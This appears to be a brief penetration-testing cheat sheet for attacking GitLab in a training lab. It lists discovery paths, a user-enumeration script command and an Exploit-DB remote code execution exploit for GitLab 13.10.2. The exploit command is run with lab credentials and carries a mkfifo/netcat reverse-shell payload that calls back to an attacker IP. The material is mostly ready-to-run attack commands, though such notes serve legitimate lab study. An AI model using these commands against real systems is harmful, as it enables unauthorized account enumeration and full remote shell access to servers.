# Footprinting & Discovery
Path /help

# Enumeration
Path /explore

# User Enum

[GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum/blob/main/gitlab_userenum.py)
```
python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
```

# RCE
[Exploit.py](https://www.exploit-db.com/exploits/49951)
```
python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
```
